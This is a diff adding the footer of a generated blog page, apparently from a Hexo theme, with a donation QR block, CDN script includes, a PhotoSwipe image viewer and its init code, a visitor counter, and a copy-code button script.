+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script>
+
+<script src="/js/clickBoom1.js"></script>
+
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+    
+  </div>
+</body>
+
+</html>
